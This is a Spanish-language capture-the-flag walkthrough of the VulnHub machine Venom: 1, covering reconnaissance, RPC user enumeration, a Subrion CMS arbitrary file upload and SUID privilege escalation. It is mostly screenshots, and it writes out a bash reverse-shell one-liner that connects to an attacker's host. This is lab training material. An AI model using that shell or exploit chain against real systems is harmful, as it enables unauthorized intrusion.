---
title: Venom1 VunlHub Walthrough
author: r4v3nC0d3
date: 2023-01-14 11:33:00 +0800
categories: [Hacking, HackTheBox]
tags: [Cracking Hashes, RPC Enumeration, FTP Enumeration, RPC RID Cycling Attack (Manual brute force) + Xargs Boost Speed Tip - Discovering valid system users, Crypto Challenge - Vigenere Cipher, Subrion CMS v4.2.1 Exploitation - Arbitrary File Upload (Phar files) (RCE), Listing system files and discovering privileged information, Abusing SUID binary (find) (Privilege Escalation)]
# pin: true
math: true
mermaid: true
---

Resolucion de Maquina Venom: 1 de la plataforma VulnHub donde vamos a estar haciendo un RPC RID Cycling Attack y un Exploitation - Arbitrary File Upload y para escalar privilegios abusamos de un binario con permisos SUID

## Reconocimiento

### Netdiscover

Empezamos haciendo un escaneo a la red para saber cual es la ip objetivo que en mi caso es la `10.0.0.16`

![](/assets/img/VulnHub/venom/netdiscover.png)

### Nmap

Una vez conocemos la ip de la maquina, iniciamos con un escaneo activo con `Nmap` para ver puertos y servicios expuestos

```
nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.0.0.16 -oG allPorts
```
![](/assets/img/VulnHub/venom/nmap1.png)

Una vez tenemos los puertos, lo siguiente seria saber servicios y versiones

```
nmap -p21,80,139,443,445 -sCV 10.0.0.16 -oN targeted
```

![](/assets/img/VulnHub/venom/nmap2.png)

### whatweb

![](/assets/img/VulnHub/venom/whatweb.png)

### HTTP

Apache2 Default Page

![](/assets/img/VulnHub/venom/apache1.png)

Si la revisas bien vas a encontrar un texto que dice `follow this to get access on somewhere` en la parte inferior de la pagina

![](/assets/img/VulnHub/venom/apache2.png)

Hacemos un `ctrl+u` para ver el sorce code y vemos una serie de numeros y letras que parece ser un hash MD5

![](/assets/img/VulnHub/venom/apache3.png)

### Hash-Identifier

Utilice la herramienta `hash-identifier` para ver que tipo de hash era y si de hecho es un hash MD5

Lo siguiente seria crackearlo

![](/assets/img/VulnHub/venom/hashi.png)

### CrackStation

Yo utilice una pagina web llamada `crackstation` para crackear el hash MD5

EL resultado es : `hostinger`

![](/assets/img/VulnHub/venom/cracks.png)

#### password ??
- hostinger

Puede ser un password, pero no tenemos usuario

## Enumeracion

### SMB

### smbmap

Para enumerar los recursos compartidos y los permisos asociados con el acceso anónimo:

![](/assets/img/VulnHub/venom/smbmap.png)

### rpcclient

Como vimos en el escaneo con nmap esta el puerto 445 abierto asi que podemos probar con `rpcclient` un NULL session

![](/assets/img/VulnHub/venom/rpcclient.png)

Entramos!

Entonces podemos empezar a enumerar

![](/assets/img/VulnHub/venom/rpcclient2.png)

Automatizamos la enumeracion aplicando hilos con xargs 

Lo que vemos parecen ser grupos

![](/assets/img/VulnHub/venom/xargs.png)

Tambien podemos probar con `lookupnames` pasandole `root` como user porque ya sabemos que la maquina es linux

El usuario existe y vemos otro `sid` `S-1-22-1-0`

![](/assets/img/VulnHub/venom/rpcclient3.png)

Automatizamos la enumeracion y buscamos en ese `sid`

![](/assets/img/VulnHub/venom/xargs2.png)

Ya tenemos 2 ususarios validos y un de ellos es hostinger asi que tenemos credenciales validas
### Users
- hostinger
- nathan
### Pass
- hostinger

## FTP

### Creds 
- hostinger : hostinger

![](/assets/img/VulnHub/venom/ftp.png)

Nos descargamos el archivo `hint.txt`

![](/assets/img/VulnHub/venom/hint.png)

![](/assets/img/VulnHub/venom/hint2.png)

El primer hash en base64 nos da un nombre de un cifrado

![](/assets/img/VulnHub/venom/base64.png)

El segundo un sitio donde crackearlo

![](/assets/img/VulnHub/venom/base642.png)

`venom.box` parece ser un dominio asi que lo agregamos al `/etc/hosts`

Probamos un `whatweb`

Esta utilizando un CMS Subrion 4.2.1

![](/assets/img/VulnHub/venom/whatweb2.png)

Vulnerable a Arbitrary File Upload

![](/assets/img/VulnHub/venom/google.png)

Tenemos que estar logueados en la pagina para poder explotar la vulnerabilidad

![](/assets/img/VulnHub/venom/web.png)

![](/assets/img/VulnHub/venom/cifrado.png)

![](/assets/img/VulnHub/venom/dora.png)

Probamos

![](/assets/img/VulnHub/venom/admin.png)

Estamos dentro

![](/assets/img/VulnHub/venom/admin2.png)

[https://vk9-sec.com/subrion-cms-4-2-1-arbitrary-file-upload-authenticated-2018-19422/](https://vk9-sec.com/subrion-cms-4-2-1-arbitrary-file-upload-authenticated-2018-19422/)
[exploit-db](https://www.exploit-db.com/exploits/49876)

## Arbitary File Upload (Authenticated)

![](/assets/img/VulnHub/venom/upload.png)

![](/assets/img/VulnHub/venom/nvim.png)

![](/assets/img/VulnHub/venom/upload2.png)

Ya estamos ejecutando comandos en el sistema como el usuario `www-data`

![](/assets/img/VulnHub/venom/www-data.png)

### NC

Nos pondemos en escucha con `nc` para recibir la conexion

![](/assets/img/VulnHub/venom/nc.png)


Nos lanzamos una shell con esta linea de comandos

```
bash -c 'bash -i >%26 /dev/tcp/<ipAttack>/<port> 0>%261'
```
![](/assets/img/VulnHub/venom/bash.png)

![](/assets/img/VulnHub/venom/nc2.png)

Hacemos tratamiento de la tty para una shell mas interactiva

![](/assets/img/VulnHub/venom/tty.png)

Ejecutamos y despues hacemos un`ctrl+z`

![](/assets/img/VulnHub/venom/tty2.png)

![](/assets/img/VulnHub/venom/tty3.png)

![](/assets/img/VulnHub/venom/tty4.png)

Cambiamos de usuario a `hostinger`

![](/assets/img/VulnHub/venom/hostinger.png)

Vemos un `.bash_history` lo podemos revisar

![](/assets/img/VulnHub/venom/history.png)

Revisamos el `.htaccess` del directorio `backup`

![](/assets/img/VulnHub/venom/htaccess.png)

Parece un password

![](/assets/img/VulnHub/venom/pass.png)

Ahora estamos como el usuario `nathan`

![](/assets/img/VulnHub/venom/nathan.png)

## Privelege Escalation

Buscamos archivos/binarios con permisos `SUID`

```
find / -perm -4000 2>/dev/null
```

Vemos el binario `find` con permisos `SUID`

![](/assets/img/VulnHub/venom/suid.png)

![](/assets/img/VulnHub/venom/gtfo.png)

[gtfobins](https://gtfobins.github.io/gtfobins/find/)

![](/assets/img/VulnHub/venom/root.png)

# R00T3D
